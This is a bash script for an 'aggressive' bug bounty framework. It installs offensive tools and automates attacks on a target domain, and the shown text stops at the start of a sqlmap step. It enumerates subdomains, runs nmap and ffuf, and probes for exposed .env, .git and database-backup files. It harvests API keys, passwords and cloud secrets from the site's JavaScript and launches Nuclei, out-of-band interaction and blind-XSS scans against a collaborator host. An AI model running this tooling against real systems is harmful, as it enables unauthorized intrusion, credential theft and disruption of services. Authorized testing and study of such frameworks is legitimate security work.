#!/bin/bash
# ============================================================
#  BUG - Aggressive Bug Bounty Automation Framework v3.0
#  Usage: bug -d example.com
#  For authorized penetration testing only
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

print_banner() {
echo -e "${RED}${BOLD}"
cat << 'EOF'
██████╗ ██╗   ██╗ ██████╗
██╔══██╗██║   ██║██╔════╝
██████╔╝██║   ██║██║  ███╗
██╔══██╗██║   ██║██║   ██║
██████╔╝╚██████╔╝╚██████╔╝
╚═════╝  ╚═════╝  ╚═════╝
EOF
echo -e "${NC}${CYAN}  Bug Bounty Automation Framework v3.0 — AGGRESSIVE MODE${NC}"
echo -e "${YELLOW}  IDOR | AUTH | BAC | XSS | SQLi | LFI | CSRF | SSRF | RCE | OWASP TOP 10${NC}"
echo ""
}

log()     { echo -e "${GREEN}[+]${NC} $1"; }
warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
error()   { echo -e "${RED}[-]${NC} $1"; }
info()    { echo -e "${BLUE}[*]${NC} $1"; }
section() {
  echo ""
  echo -e "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${MAGENTA}${BOLD}  $1${NC}"
  echo -e "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo ""
}

usage() {
  echo -e "${CYAN}Usage:${NC} bug -d <domain> [options]"
  echo ""
  echo -e "  ${BOLD}-d${NC}  Target domain              (required)"
  echo -e "  ${BOLD}-o${NC}  Output dir                 (default: ~/bug-results/<domain>)"
  echo -e "  ${BOLD}-t${NC}  Threads                    (default: 50)"
  echo -e "  ${BOLD}-s${NC}  Skip tool install check"
  echo -e "  ${BOLD}-p${NC}  Passive only"
  echo -e "  ${BOLD}-w${NC}  Custom wordlist for fuzzing"
  echo -e "  ${BOLD}-c${NC}  Collaborator/interactsh URL (for SSRF/OOB)"
  echo -e "  ${BOLD}-h${NC}  Help"
  echo ""
  echo -e "  ${YELLOW}Examples:${NC}"
  echo -e "    bug -d example.com"
  echo -e "    bug -d example.com -t 100 -c your.oast.fun"
  exit 0
}

# ─── ARGS ─────────────────────────────────────────────────
DOMAIN=""
THREADS=50
SKIP_INSTALL=false
PASSIVE_ONLY=false
OUTPUT_BASE="$HOME/bug-results"
CUSTOM_WORDLIST=""
COLLAB_URL=""

while getopts "d:o:t:w:c:sph" opt; do
  case $opt in
    d) DOMAIN="$OPTARG" ;;
    o) OUTPUT_BASE="$OPTARG" ;;
    t) THREADS="$OPTARG" ;;
    w) CUSTOM_WORDLIST="$OPTARG" ;;
    c) COLLAB_URL="$OPTARG" ;;
    s) SKIP_INSTALL=true ;;
    p) PASSIVE_ONLY=true ;;
    h) usage ;;
    *) usage ;;
  esac
done

[ -z "$DOMAIN" ] && { error "Domain required. Use: bug -d example.com"; echo ""; usage; }

# ─── DIRECTORIES ──────────────────────────────────────────
OUTPUT_DIR="$OUTPUT_BASE/$DOMAIN"
D_RECON="$OUTPUT_DIR/01-recon"
D_SUBS="$OUTPUT_DIR/02-subdomains"
D_URLS="$OUTPUT_DIR/03-urls"
D_JS="$OUTPUT_DIR/04-javascript"
D_ENDPOINTS="$OUTPUT_DIR/05-endpoints"
D_VULN="$OUTPUT_DIR/06-vulnerabilities"
D_NUCLEI="$OUTPUT_DIR/07-nuclei"
D_REPORT="$OUTPUT_DIR/08-report"
D_LOGS="$OUTPUT_DIR/logs"
D_SCREENSHOTS="$OUTPUT_DIR/09-screenshots"

START_TIME=$(date +%s)
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
LOGFILE="$D_LOGS/bug.log"

setup_dirs() {
  mkdir -p "$D_RECON" "$D_SUBS" "$D_URLS" "$D_JS/files" \
           "$D_ENDPOINTS" "$D_VULN/sqlmap" "$D_NUCLEI" \
           "$D_REPORT" "$D_LOGS" "$D_SCREENSHOTS"
  log "Results directory: ${CYAN}$OUTPUT_DIR${NC}"
}

tlog() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOGFILE" 2>/dev/null; }

# ─── TOOL INSTALLER ───────────────────────────────────────
REQUIRED_TOOLS=(
  "subfinder:go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
  "httpx:go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
  "nuclei:go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
  "katana:go install github.com/projectdiscovery/katana/cmd/katana@latest"
  "waybackurls:go install github.com/tomnomnom/waybackurls@latest"
  "gau:go install github.com/lc/gau/v2/cmd/gau@latest"
  "gospider:go install github.com/jaeles-project/gospider@latest"
  "hakrawler:go install github.com/hakluke/hakrawler@latest"
  "getJS:go install github.com/003random/getJS@latest"
  "gf:go install github.com/tomnomnom/gf@latest"
  "qsreplace:go install github.com/tomnomnom/qsreplace@latest"
  "anew:go install github.com/tomnomnom/anew@latest"
  "unfurl:go install github.com/tomnomnom/unfurl@latest"
  "dalfox:go install github.com/hahwul/dalfox/v2@latest"
  "ffuf:go install github.com/ffuf/ffuf/v2@latest"
  "assetfinder:go install github.com/tomnomnom/assetfinder@latest"
  "amass:go install -v github.com/owasp-amass/amass/v4/...@master"
  "interactsh-client:go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
  "dnsx:go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
  "alterx:go install github.com/projectdiscovery/alterx/cmd/alterx@latest"
  "notify:go install -v github.com/projectdiscovery/notify/cmd/notify@latest"
  "sqlmap:apt-get install -y sqlmap"
  "arjun:pip3 install arjun --break-system-packages"
  "trufflehog:go install github.com/trufflesecurity/trufflehog/v3@latest"
  "jq:apt-get install -y jq"
  "curl:apt-get install -y curl"
  "nmap:apt-get install -y nmap"
  "whatweb:apt-get install -y whatweb"
)

check_and_install_tools() {
  section "⚙  TOOL VERIFICATION & AUTO-INSTALL"

  # Ensure Go is installed
  if ! command -v go &>/dev/null && [ ! -f /usr/local/go/bin/go ]; then
    warn "Go not found — installing Go 1.22..."
    wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz -O /tmp/go.tar.gz
    rm -rf /usr/local/go && tar -C /usr/local -xzf /tmp/go.tar.gz
    export PATH=$PATH:/usr/local/go/bin
    echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc
    echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.zshrc 2>/dev/null
    log "Go installed"
  fi
  export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin

  local missing=0
  for entry in "${REQUIRED_TOOLS[@]}"; do
    local tool="${entry%%:*}"
    local cmd="${entry#*:}"
    if command -v "$tool" &>/dev/null || [ -f "$HOME/go/bin/$tool" ]; then
      log "${GREEN}✓${NC} $tool"
    else
      warn "Installing $tool..."
      eval "$cmd" >> "$D_LOGS/install.log" 2>&1
      if command -v "$tool" &>/dev/null || [ -f "$HOME/go/bin/$tool" ]; then
        log "${GREEN}✓${NC} $tool — installed"
      else
        error "$tool failed — check $D_LOGS/install.log"
        ((missing++))
      fi
    fi
  done

  # GF patterns
  if [ ! -d "$HOME/.gf" ]; then
    info "Installing GF patterns..."
    mkdir -p "$HOME/.gf"
    git clone -q https://github.com/1ndianl33t/Gf-Patterns /tmp/gf-patterns 2>/dev/null
    cp /tmp/gf-patterns/*.json "$HOME/.gf/" 2>/dev/null
    git clone -q https://github.com/tomnomnom/gf /tmp/gf-base 2>/dev/null
    cp /tmp/gf-base/examples/*.json "$HOME/.gf/" 2>/dev/null
    log "GF patterns installed"
  fi

  # LinkFinder
  if [ ! -f "/opt/LinkFinder/linkfinder.py" ]; then
    info "Installing LinkFinder..."
    git clone -q https://github.com/GerbenJavado/LinkFinder.git /opt/LinkFinder 2>/dev/null
    pip3 install -r /opt/LinkFinder/requirements.txt --break-system-packages -q 2>/dev/null
    log "LinkFinder installed"
  fi

  # SecLists
  if [ ! -d "/usr/share/seclists" ]; then
    info "Installing SecLists..."
    apt-get install -y seclists -qq 2>/dev/null || \
      git clone -q --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists
    log "SecLists installed"
  fi

  # Update nuclei templates
  info "Updating Nuclei templates..."
  nuclei -update-templates -silent 2>/dev/null
  log "Nuclei templates updated"

  [ $missing -gt 0 ] && warn "$missing tool(s) had issues — continuing anyway"
}

# ─── PHASE 1: SUBDOMAIN ENUMERATION ──────────────────────
phase_subdomains() {
  section "PHASE 1 ▸ SUBDOMAIN ENUMERATION"
  tlog "Phase 1 started"

  # subfinder — all sources, recursive
  info "subfinder (recursive, all sources)..."
  subfinder -d "$DOMAIN" -all -recursive -silent \
    -t "$THREADS" -o "$D_SUBS/subfinder.txt" 2>/dev/null
  log "subfinder: $(wc -l < "$D_SUBS/subfinder.txt" 2>/dev/null || echo 0) subs"

  # assetfinder
  info "assetfinder..."
  assetfinder --subs-only "$DOMAIN" > "$D_SUBS/assetfinder.txt" 2>/dev/null
  log "assetfinder: $(wc -l < "$D_SUBS/assetfinder.txt") subs"

  # crt.sh — certificate transparency
  info "crt.sh certificate transparency..."
  curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
    jq -r '.[].name_value' 2>/dev/null | \
    sed 's/\*\.//g' | tr ',' '\n' | sort -u > "$D_SUBS/crtsh.txt"
  log "crt.sh: $(wc -l < "$D_SUBS/crtsh.txt" 2>/dev/null || echo 0) subs"

  # RapidDNS
  info "RapidDNS..."
  curl -s "https://rapiddns.io/subdomain/$DOMAIN?full=1#result" 2>/dev/null | \
    grep -oP '(?<=<td>)[a-zA-Z0-9._-]+\.'$DOMAIN'(?=</td>)' | \
    sort -u > "$D_SUBS/rapiddns.txt"
  log "RapidDNS: $(wc -l < "$D_SUBS/rapiddns.txt" 2>/dev/null || echo 0) subs"

  # SecurityTrails (if key set)
  if [ -n "$SECTRAILS_KEY" ]; then
    info "SecurityTrails API..."
    curl -s "https://api.securitytrails.com/v1/domain/$DOMAIN/subdomains" \
      -H "APIKEY: $SECTRAILS_KEY" 2>/dev/null | \
      jq -r '.subdomains[]' 2>/dev/null | \
      sed "s/$/.${DOMAIN}/" > "$D_SUBS/securitytrails.txt"
  fi

  # DNS brute force
  info "DNS bruteforce (top 5000)..."
  DNSBL="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
  [ -f "$DNSBL" ] && \
    dnsx -d "$DOMAIN" -w "$DNSBL" -silent -o "$D_SUBS/dnsx_brute.txt" 2>/dev/null
  log "DNS brute: $(wc -l < "$D_SUBS/dnsx_brute.txt" 2>/dev/null || echo 0) subs"

  # alterx — permutation-based subdomain generation
  info "alterx permutation engine..."
  cat "$D_SUBS/subfinder.txt" 2>/dev/null | \
    alterx -silent 2>/dev/null | \
    dnsx -silent 2>/dev/null > "$D_SUBS/alterx.txt"
  log "alterx permutations: $(wc -l < "$D_SUBS/alterx.txt" 2>/dev/null || echo 0) resolved"

  # amass — 2 min passive scan
  info "amass passive (2 min)..."
  timeout 120 amass enum -passive -d "$DOMAIN" \
    -o "$D_SUBS/amass.txt" 2>/dev/null || true
  log "amass: $(wc -l < "$D_SUBS/amass.txt" 2>/dev/null || echo 0) subs"

  # Merge & deduplicate
  cat "$D_SUBS/"*.txt 2>/dev/null | \
    sort -u | \
    grep -E "^[a-zA-Z0-9][a-zA-Z0-9._-]+\.$DOMAIN$" | \
    grep -v "^\*" > "$D_SUBS/all_subdomains.txt"

  log "${GREEN}Total unique subdomains: $(wc -l < "$D_SUBS/all_subdomains.txt")${NC}"
  tlog "Phase 1 done — $(wc -l < "$D_SUBS/all_subdomains.txt") subdomains"
}

# ─── PHASE 2: LIVE HOST PROBING ──────────────────────────
phase_live_hosts() {
  section "PHASE 2 ▸ LIVE HOST DETECTION"
  tlog "Phase 2 started"

  # httpx — aggressive probing
  info "httpx probing all subdomains..."
  cat "$D_SUBS/all_subdomains.txt" | \
    httpx -silent \
      -status-code -title -tech-detect \
      -content-length -content-type \
      -follow-redirects -threads "$THREADS" \
      -ports 80,443,8080,8443,8000,8008,8888,3000,5000,9000,4443 \
      -o "$D_RECON/live_hosts_full.txt" \
      -json >> "$D_LOGS/httpx.log" 2>&1

  # Parse live URLs
  cat "$D_RECON/live_hosts_full.txt" | \
    jq -r '.url' 2>/dev/null | sort -u > "$D_RECON/live_urls.txt"

  # Fallback if JSON parse fails
  if [ ! -s "$D_RECON/live_urls.txt" ]; then
    grep -oP 'https?://[^\s"]+' "$D_RECON/live_hosts_full.txt" | \
      sort -u > "$D_RECON/live_urls.txt"
  fi

  # Split by status code
  for code in 200 201 204 301 302 401 403 405 500 502 503; do
    grep "\"status\":$code\|\" $code \"" "$D_RECON/live_hosts_full.txt" | \
      jq -r '.url' 2>/dev/null | sort -u > "$D_RECON/status_${code}.txt"
  done

  # nmap service scan on live hosts
  info "nmap service scan on live hosts..."
  cat "$D_RECON/live_urls.txt" | \
    grep -oP '(?<=://)([^/:]+)' | sort -u > "$D_RECON/live_ips.txt"
  nmap -sV -sC --open -iL "$D_RECON/live_ips.txt" \
    -oN "$D_RECON/nmap.txt" -oX "$D_RECON/nmap.xml" \
    -p 80,443,8080,8443,8000,8888,3000,5000,9000,4443,22,21,25,3306,5432,6379,27017 \
    --min-rate 1000 -T4 >> "$D_LOGS/nmap.log" 2>&1
  log "nmap complete"

  # Whatweb fingerprinting
  info "WhatWeb fingerprinting..."
  whatweb --no-errors -q --log-brief="$D_RECON/whatweb.txt" \
    --input-file="$D_RECON/live_urls.txt" 2>/dev/null
  log "WhatWeb done"

  log "Live: $(wc -l < "$D_RECON/live_urls.txt") | 200: $(wc -l < "$D_RECON/status_200.txt" 2>/dev/null || echo 0) | 401: $(wc -l < "$D_RECON/status_401.txt" 2>/dev/null || echo 0) | 403: $(wc -l < "$D_RECON/status_403.txt" 2>/dev/null || echo 0)"
  tlog "Phase 2 done"
}

# ─── PHASE 3: URL & PARAMETER COLLECTION ─────────────────
phase_url_collection() {
  section "PHASE 3 ▸ URL & PARAMETER HARVESTING"
  tlog "Phase 3 started"

  # Wayback Machine
  info "Wayback Machine..."
  cat "$D_SUBS/all_subdomains.txt" | \
    waybackurls 2>/dev/null | sort -u > "$D_URLS/wayback.txt"
  log "Wayback: $(wc -l < "$D_URLS/wayback.txt") URLs"

  # GAU — Wayback + URLScan + OTX + CommonCrawl
  info "GAU (multi-source)..."
  cat "$D_SUBS/all_subdomains.txt" | \
    gau --subs --threads "$THREADS" \
        --blacklist png,jpg,gif,jpeg,svg,ico,woff,woff2,ttf,eot,mp4,mp3 \
        2>/dev/null | sort -u > "$D_URLS/gau.txt"
  log "GAU: $(wc -l < "$D_URLS/gau.txt") URLs"

  # CommonCrawl direct query
  info "CommonCrawl..."
  curl -s "http://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.$DOMAIN&output=json" \
    2>/dev/null | jq -r '.url' 2>/dev/null | sort -u > "$D_URLS/commoncrawl.txt"
  log "CommonCrawl: $(wc -l < "$D_URLS/commoncrawl.txt" 2>/dev/null || echo 0) URLs"

  # URLScan.io
  info "URLScan.io..."
  curl -s "https://urlscan.io/api/v1/search/?q=domain:$DOMAIN&size=10000" \
    2>/dev/null | jq -r '.results[].page.url' 2>/dev/null | \
    sort -u > "$D_URLS/urlscan.txt"
  log "URLScan: $(wc -l < "$D_URLS/urlscan.txt" 2>/dev/null || echo 0) URLs"

  if [ "$PASSIVE_ONLY" = false ]; then
    # Katana — deep active crawl
    info "Katana active crawl (depth 5, JS parsing)..."
    cat "$D_RECON/live_urls.txt" | \
      katana -d 5 -jc -jsl -aff \
             -ef css,png,jpg,jpeg,gif,ico,svg,woff,woff2,ttf,eot \
             -c "$THREADS" -silent \
             -o "$D_URLS/katana.txt" 2>/dev/null
    log "Katana: $(wc -l < "$D_URLS/katana.txt" 2>/dev/null || echo 0) URLs"

    # Gospider
    info "Gospider..."
    gospider -S "$D_RECON/live_urls.txt" -d 4 -c 20 -t 20 \
      --js --other-source --sitemap --robots -q 2>/dev/null | \
      grep -oP 'https?://[^\s"]+' | sort -u > "$D_URLS/gospider.txt"
    log "Gospider: $(wc -l < "$D_URLS/gospider.txt") URLs"

    # Hakrawler
    info "Hakrawler..."
    cat "$D_RECON/live_urls.txt" | \
      hakrawler -d 4 -subs -u 2>/dev/null | \
      sort -u > "$D_URLS/hakrawler.txt"
    log "Hakrawler: $(wc -l < "$D_URLS/hakrawler.txt") URLs"
  fi

  # Merge all URLs
  cat "$D_URLS/"*.txt 2>/dev/null | \
    grep -E "^https?://" | \
    grep -iE "$DOMAIN" | \
    grep -viE "\.(png|jpg|jpeg|gif|bmp|svg|ico|css|woff|woff2|ttf|eot|mp4|mp3|avi|zip|tar\.gz|pdf|docx?|xlsx?)(\?|$)" | \
    sort -u > "$D_URLS/all_urls.txt"
  log "${GREEN}Total URLs: $(wc -l < "$D_URLS/all_urls.txt")${NC}"

  # Extract parametrized URLs
  grep "?" "$D_URLS/all_urls.txt" | sort -u > "$D_URLS/urls_with_params.txt"
  log "URLs with params: $(wc -l < "$D_URLS/urls_with_params.txt")"

  # Unique param keys
  cat "$D_URLS/urls_with_params.txt" | unfurl --unique keys 2>/dev/null | \
    sort -u > "$D_URLS/unique_params.txt"
  log "Unique param names: $(wc -l < "$D_URLS/unique_params.txt")"

  # GF pattern matching — categorize by vuln
  info "GF pattern matching..."
  mkdir -p "$D_URLS/gf"
  local GF_TOTAL=0
  for p in xss sqli lfi ssrf ssti idor rce redirect debug interestingparams \
            upload cors aws-keys s3-buckets firebase jwt; do
    gf "$p" "$D_URLS/all_urls.txt" 2>/dev/null | sort -u > "$D_URLS/gf/${p}.txt"
    local c=$(wc -l < "$D_URLS/gf/${p}.txt" 2>/dev/null || echo 0)
    [ "$c" -gt 0 ] && { log "GF ${YELLOW}${p}${NC}: $c URLs"; GF_TOTAL=$((GF_TOTAL + c)); }
  done
  log "${YELLOW}Total GF matches: $GF_TOTAL${NC}"
  tlog "Phase 3 done"
}

# ─── PHASE 4: JAVASCRIPT ANALYSIS ────────────────────────
phase_javascript() {
  section "PHASE 4 ▸ JAVASCRIPT ANALYSIS"
  tlog "Phase 4 started"

  # Collect JS URLs
  grep -iE "\.js(\?|$)" "$D_URLS/all_urls.txt" | sort -u > "$D_JS/js_urls.txt"
  cat "$D_RECON/live_urls.txt" | \
    getJS --complete 2>/dev/null >> "$D_JS/js_urls.txt"
  sort -u "$D_JS/js_urls.txt" -o "$D_JS/js_urls.txt"
  log "JS URLs found: $(wc -l < "$D_JS/js_urls.txt")"

  # Download all JS
  info "Downloading JS files..."
  while IFS= read -r jsurl; do
    local fname
    fname=$(echo "$jsurl" | md5sum | cut -d' ' -f1)
    curl -s -L --max-time 15 --compressed "$jsurl" \
      -o "$D_JS/files/${fname}.js" 2>/dev/null
  done < "$D_JS/js_urls.txt"
  log "JS files downloaded: $(ls "$D_JS/files/"*.js 2>/dev/null | wc -l)"

  # LinkFinder — extract endpoints from every JS file
  info "LinkFinder endpoint extraction..."
  if [ -f "/opt/LinkFinder/linkfinder.py" ]; then
    while IFS= read -r jsurl; do
      python3 /opt/LinkFinder/linkfinder.py \
        -i "$jsurl" -o cli 2>/dev/null >> "$D_JS/linkfinder_raw.txt"
    done < "$D_JS/js_urls.txt"
  fi

  # Also run linkfinder on local downloaded files
  for f in "$D_JS/files/"*.js; do
    python3 /opt/LinkFinder/linkfinder.py \
      -i "$f" -o cli 2>/dev/null >> "$D_JS/linkfinder_raw.txt"
  done
  sort -u "$D_JS/linkfinder_raw.txt" > "$D_JS/endpoints_from_js.txt" 2>/dev/null
  log "Endpoints from JS: $(wc -l < "$D_JS/endpoints_from_js.txt" 2>/dev/null || echo 0)"

  # Regex secret hunting in JS
  info "Secret hunting in JS files..."
  grep -rhoiE \
    '(api_key|apikey|api-key|api_secret|secret_key|access_key|access_token|auth_token|client_secret|client_id|private_key|oauth_token|bearer|x-api-key|password|passwd|db_password|database_url|aws_access_key_id|aws_secret_access_key|firebase|twilio|stripe|sendgrid|mailgun|github_token|slack_token|heroku|jwt)["\s:=]+["\x27]?([A-Za-z0-9+/=_\-\.]{8,80})' \
    "$D_JS/files/" 2>/dev/null | sort -u > "$D_JS/secrets_regex.txt"
  log "${YELLOW}Regex secrets: $(wc -l < "$D_JS/secrets_regex.txt")${NC}"

  # TruffleHog — verified secrets
  info "TruffleHog verified secret scan..."
  trufflehog filesystem "$D_JS/files/" \
    --json --no-update 2>/dev/null | \
    jq -r '"[" + .DetectorName + "] " + .SourceMetadata.Data.Filesystem.file + " → " + .Raw' \
    2>/dev/null > "$D_JS/trufflehog_verified.txt"
  log "${RED}TruffleHog verified: $(wc -l < "$D_JS/trufflehog_verified.txt")${NC}"

  # Extract paths from JS content
  grep -rhoiE '"(/[a-zA-Z0-9_./-]{2,80})"' "$D_JS/files/" 2>/dev/null | \
    sed 's/"//g' | grep -v "\.\(png\|jpg\|css\|gif\|svg\)" | \
    sort -u >> "$D_JS/endpoints_from_js.txt"

  # Find hardcoded IPs/domains in JS
  grep -rhoiE '([0-9]{1,3}\.){3}[0-9]{1,3}(:[0-9]+)?' "$D_JS/files/" 2>/dev/null | \
    grep -v "^0\.\|^127\.\|^255\." | sort -u > "$D_JS/hardcoded_ips.txt"
  log "Hardcoded IPs: $(wc -l < "$D_JS/hardcoded_ips.txt")"

  # Find internal hostnames
  grep -rhoiE '(https?://[a-zA-Z0-9._-]+\.(internal|local|dev|staging|test|corp|lan|intranet))' \
    "$D_JS/files/" 2>/dev/null | sort -u > "$D_JS/internal_hosts.txt"
  log "Internal hosts: $(wc -l < "$D_JS/internal_hosts.txt")"

  tlog "Phase 4 done"
}

# ─── PHASE 5: ENDPOINT & PATH DISCOVERY ──────────────────
phase_endpoints() {
  section "PHASE 5 ▸ ENDPOINT & PATH DISCOVERY"
  tlog "Phase 5 started"

  # Combine all known paths
  cat "$D_JS/endpoints_from_js.txt" "$D_JS/linkfinder_raw.txt" 2>/dev/null | \
    grep -E "^/" | sort -u > "$D_ENDPOINTS/known_paths.txt"
  log "Known paths from JS: $(wc -l < "$D_ENDPOINTS/known_paths.txt")"

  # Pick wordlists
  WL_DIR="/usr/share/seclists/Discovery/Web-Content"
  WORDLISTS=()
  [ -n "$CUSTOM_WORDLIST" ] && WORDLISTS+=("$CUSTOM_WORDLIST")
  [ -f "$WL_DIR/raft-large-directories.txt" ]     && WORDLISTS+=("$WL_DIR/raft-large-directories.txt")
  [ -f "$WL_DIR/raft-large-files.txt" ]           && WORDLISTS+=("$WL_DIR/raft-large-files.txt")
  [ -f "$WL_DIR/api/api-endpoints.txt" ]          && WORDLISTS+=("$WL_DIR/api/api-endpoints.txt")
  [ -f "$WL_DIR/api/objects.txt" ]                && WORDLISTS+=("$WL_DIR/api/objects.txt")
  [ -f "$WL_DIR/common.txt" ]                     && WORDLISTS+=("$WL_DIR/common.txt")
  [ -f "$WL_DIR/quickhits.txt" ]                  && WORDLISTS+=("$WL_DIR/quickhits.txt")

  if [ "$PASSIVE_ONLY" = false ]; then
    info "FFUF directory + file fuzzing on all live hosts..."
    while IFS= read -r base_url; do
      local slug
      slug=$(echo "$base_url" | sed 's|https\?://||;s|[/:]|-|g')
      for wl in "${WORDLISTS[@]}"; do
        ffuf -u "${base_url}/FUZZ" -w "$wl" \
          -mc 200,201,204,301,302,307,401,403,405 \
          -ac -t "$THREADS" -timeout 10 \
          -o "$D_ENDPOINTS/ffuf_${slug}.json" -of json \
          -s 2>/dev/null
      done

      # Also fuzz with extensions
      ffuf -u "${base_url}/FUZZ" \
        -w "$WL_DIR/raft-medium-files.txt" \
        -e .php,.asp,.aspx,.jsp,.json,.xml,.bak,.old,.conf,.config,.log,.sql,.txt,.yaml,.yml,.env \
        -mc 200,201,204,301,302,401,403 \
        -ac -t "$THREADS" -timeout 10 \
        -o "$D_ENDPOINTS/ffuf_ext_${slug}.json" -of json \
        -s 2>/dev/null
    done < "$D_RECON/status_200.txt"

    # Parse all FFUF results
    find "$D_ENDPOINTS" -name "ffuf_*.json" -exec \
      jq -r '.results[].url' {} \; 2>/dev/null | \
      sort -u > "$D_ENDPOINTS/ffuf_all.txt"
    log "FFUF discovered: $(wc -l < "$D_ENDPOINTS/ffuf_all.txt") paths"
  fi

  # Aggressive API path probing
  info "API endpoint probing..."
  API_PATHS=(
    "/api" "/api/v1" "/api/v2" "/api/v3" "/api/v4"
    "/rest" "/rest/v1" "/rest/v2"
    "/graphql" "/graphiql" "/gql"
    "/swagger" "/swagger.json" "/swagger.yaml"
    "/swagger-ui.html" "/swagger-ui" "/api-docs"
    "/openapi.json" "/openapi.yaml" "/v1/api-docs"
    "/.well-known/security.txt" "/.well-known/openid-configuration"
    "/robots.txt" "/sitemap.xml" "/sitemap_index.xml"
    "/crossdomain.xml" "/clientaccesspolicy.xml"
    "/.git/HEAD" "/.git/config" "/.svn/entries"
    "/.env" "/.env.local" "/.env.production" "/.env.backup"
    "/config.json" "/config.yaml" "/config.yml" "/settings.json"
    "/package.json" "/package-lock.json" "/yarn.lock"
    "/phpinfo.php" "/info.php" "/test.php"
    "/admin" "/administrator" "/wp-admin" "/wp-login.php"
    "/wp-json/wp/v2/users" "/xmlrpc.php"
    "/login" "/signin" "/register" "/signup"
    "/dashboard" "/panel" "/console" "/management"
    "/actuator" "/actuator/health" "/actuator/env" "/actuator/mappings"
    "/metrics" "/health" "/healthz" "/status" "/ping" "/version"
    "/api/users" "/api/user" "/api/admin" "/api/config"
    "/api/keys" "/api/token" "/api/profile" "/api/me"
    "/api/debug" "/debug" "/__debug__" "/dev"
    "/backup" "/backup.sql" "/dump.sql" "/db.sql"
    "/server-status" "/server-info" "/.htaccess"
    "/trace" "/TRACE" "/.DS_Store"
  )

  > "$D_ENDPOINTS/api_probe.txt"
  while IFS= read -r base; do
    for path in "${API_PATHS[@]}"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        --max-time 8 -L "${base}${path}" 2>/dev/null)
      [[ "$STATUS" =~ ^(200|201|204|301|302|401|403|405|500)$ ]] && \
        echo "$STATUS ${base}${path}" >> "$D_ENDPOINTS/api_probe.txt"
    done
  done < "$D_RECON/live_urls.txt"
  log "API paths probed: $(wc -l < "$D_ENDPOINTS/api_probe.txt")"

  # Arjun — hidden parameter discovery
  info "Arjun hidden parameter discovery (top 50 URLs)..."
  head -50 "$D_RECON/status_200.txt" 2>/dev/null | \
    while IFS= read -r url; do
      arjun -u "$url" --stable -t 10 -q 2>/dev/null >> "$D_ENDPOINTS/arjun.txt"
    done
  log "Arjun done"

  tlog "Phase 5 done"
}

# ─── PHASE 6: NUCLEI SCANNING ─────────────────────────────
phase_nuclei() {
  section "PHASE 6 ▸ NUCLEI — AUTOMATED VULN SCANNING"
  tlog "Phase 6 started"

  # Full scan — all severities
  info "Nuclei full template scan..."
  nuclei -l "$D_RECON/live_urls.txt" \
    -t "$HOME/nuclei-templates/" \
    -severity low,medium,high,critical \
    -c "$THREADS" -retries 3 -timeout 15 \
    -o "$D_NUCLEI/nuclei_all.txt" \
    -je "$D_NUCLEI/nuclei_all.json" \
    -stats -silent 2>/dev/null
  log "Nuclei total: $(wc -l < "$D_NUCLEI/nuclei_all.txt" 2>/dev/null || echo 0)"

  # Targeted tag scans
  local TAGS=(xss sqli lfi lfi rce ssrf idor ssti auth-bypass
              cors cve exposure misconfig takeover
              default-login weak-password token oast
              graphql jwt api-key)
  for tag in "${TAGS[@]}"; do
    nuclei -l "$D_RECON/live_urls.txt" \
      -tags "$tag" -c "$THREADS" -silent \
      -o "$D_NUCLEI/tag_${tag}.txt" 2>/dev/null
    local c=$(wc -l < "$D_NUCLEI/tag_${tag}.txt" 2>/dev/null || echo 0)
    [ "$c" -gt 0 ] && log "${YELLOW}[$tag]${NC} $c findings"
  done

  # CVE scan
  info "CVE template scan..."
  nuclei -l "$D_RECON/live_urls.txt" \
    -t cves/ -c "$THREADS" -silent \
    -o "$D_NUCLEI/cves.txt" 2>/dev/null
  log "CVEs: $(wc -l < "$D_NUCLEI/cves.txt" 2>/dev/null || echo 0)"

  # Subdomain takeover check
  info "Subdomain takeover check..."
  nuclei -l "$D_RECON/live_urls.txt" \
    -t takeovers/ -c "$THREADS" -silent \
    -o "$D_NUCLEI/takeovers.txt" 2>/dev/null
  log "Takeovers: $(wc -l < "$D_NUCLEI/takeovers.txt" 2>/dev/null || echo 0)"

  # Interactsh OOB scan
  info "OOB/OAST scan via interactsh..."
  nuclei -l "$D_RECON/live_urls.txt" \
    -t oast/ -iserver "oast.pro" -c "$THREADS" -silent \
    -o "$D_NUCLEI/oast.txt" 2>/dev/null

  tlog "Phase 6 done"
}

# ─── PHASE 7: TARGETED VULNERABILITY TESTING ─────────────
phase_vulns() {
  section "PHASE 7 ▸ TARGETED VULNERABILITY TESTING"
  tlog "Phase 7 started"

  # ── XSS — Dalfox ─────────────────────────────────────
  info "XSS — Dalfox (blind + DOM + reflected)..."
  local BLIND_XSS=""
  [ -n "$COLLAB_URL" ] && BLIND_XSS="--blind $COLLAB_URL"
  cat "$D_URLS/gf/xss.txt" 2>/dev/null | \
    dalfox pipe $BLIND_XSS \
      --silence --skip-bav --timeout 10 \
      --worker "$THREADS" \
      -o "$D_VULN/xss_dalfox.txt" 2>/dev/null
  log "XSS: $(wc -l < "$D_VULN/xss_dalfox.txt" 2>/dev/null || echo 0)"

  # ── SQLi — sqlmap ────────────────────────────────────
  info "SQLi — sqlmap (level 5, risk 3)..."
